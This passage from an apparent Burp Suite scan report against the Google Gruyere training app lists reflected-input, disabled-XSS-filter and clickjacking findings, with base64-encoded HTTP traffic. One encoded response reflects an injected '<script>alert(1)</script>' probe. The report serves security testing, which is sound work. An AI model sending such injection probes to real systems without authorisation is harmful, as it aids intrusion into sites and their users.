Q2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPkludmFsaWQgcmVxdWVzdDogL3NuaXBwZXRzLmd0bGxhM2d2PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PnB0Mjg3PC9kaXY+CgoKPC9ib2R5PgoKPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>62462912597842688</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/snippets.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/snippets.gtl [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsOGxhNWx1OTdkYiBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNCkNvb2tpZTogR1JVWUVSRV9JRD00MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogMDIwODM2YTNiMGRjOGRkZjg0ZGEyMzJjMjZkMTllYWUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MTo1NCBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY1Ng0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPlVucmVjb2duaXplZCBmaWxlIHR5cGUgKC9zbmlwcGV0cy5ndGw4bGE1bHU5N2RiKS48L2Rpdj4KCgo8L2JvZHk+Cgo8L2h0bWw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4723300126545897472</serialNumber>
    <type>5245360</type>
    <name><![CDATA[Browser cross-site scripting filter disabled]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/upload.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/upload.gtl]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some browsers, including Internet Explorer, contain built-in filters designed to protect against cross-site scripting (XSS) attacks. Applications can instruct browsers to disable this filter by setting the following response header:</p>
<p><b>X-XSS-Protection: 0</b></p>
<p>This behavior does not in itself constitute a vulnerability; in some cases XSS filters may themselves be leveraged to perform attacks against application users. However, in typical situations XSS filters do provide basic protection for application users against some XSS vulnerabilities in applications. The presence of this header should be reviewed to establish whether it affects the application's security posture. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Review whether the application needs to disable XSS filters. In most cases you can gain the protection provided by XSS filters without the associated risks by using the following response header:</p>
<p><b>X-XSS-Protection: 1; mode=block</b></p>
<p>When this header is set, browsers that detect an XSS attack will simply render a blank page instead of attempting to sanitize the injected script. This behavior is considerably less likely to introduce new security issues. </p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="http://blogs.msdn.com/b/ieinternals/archive/2011/01/31/controlling-the-internet-explorer-xss-filter-with-the-x-xss-protection-http-header.aspx">Controlling the XSS Filter</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZDVkY2EzNjg5YTRlMDUwOWJlYjRhN2Q0OGZmNzE3ZjU7bz0xDQpWYXJ5OiBBY2NlcHQtRW5jb2RpbmcNCkRhdGU6IFRodSwgMTggSmFuIDIwMTggMDk6NDI6MDkgR01UDQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDI5NzINCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhRE9DVFlQRSBIVE1MIFBVQkxJQyAiLS8vVzNDLy9EVEQgSFRNTCA0LjAxIFRyYW5zaXRpb25hbC8vRU4iPgo8IS0tIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuIC0tPgo8aHRtbD4KPGhlYWQ+Cjx0aXRsZT5HcnV5ZXJlOiBVcGxvYWQ8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxoMj5HcnV5ZXJlOiBVcGxvYWQ8L2gyPgoKPGRpdiBjbGFzcz0nY29udGVudCc+CjxoMz5TZWxlY3QgYSBmaWxlIHRvIHVwbG9hZCB0byB5b3VyIGFjY291bnQuPC9oMz4KCgoKPGRpdj4KPGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJyBhY3Rpb249Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkMic+Cjx0YWJsZT4KPHRyPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSd1cGxvYWRfZmlsZScgc2l6ZT0nNTAnPgo8L3RkPjwvdHI+Cjx0cj48dGQgYWxpZ249J2NlbnRlcic+CiAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJz4KPC90ZD48L3RyPgo8L3RhYmxlPgo8L2Zvcm0+CjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5207946657477308416</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/upload.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/upload.gtl]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCBIVFRQLzEuMQ0KSG9zdDogZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20NCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQWNjZXB0OiAqLyoNCkFjY2VwdC1MYW5ndWFnZTogZW4NClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdpbjY0OyB4NjQ7IFRyaWRlbnQvNS4wKQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZDVkY2EzNjg5YTRlMDUwOWJlYjRhN2Q0OGZmNzE3ZjU7bz0xDQpWYXJ5OiBBY2NlcHQtRW5jb2RpbmcNCkRhdGU6IFRodSwgMTggSmFuIDIwMTggMDk6NDI6MDkgR01UDQpTZXJ2ZXI6IEdvb2dsZSBGcm9udGVuZA0KQ29udGVudC1MZW5ndGg6IDI5NzINCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhRE9DVFlQRSBIVE1MIFBVQkxJQyAiLS8vVzNDLy9EVEQgSFRNTCA0LjAxIFRyYW5zaXRpb25hbC8vRU4iPgo8IS0tIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuIC0tPgo8aHRtbD4KPGhlYWQ+Cjx0aXRsZT5HcnV5ZXJlOiBVcGxvYWQ8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlna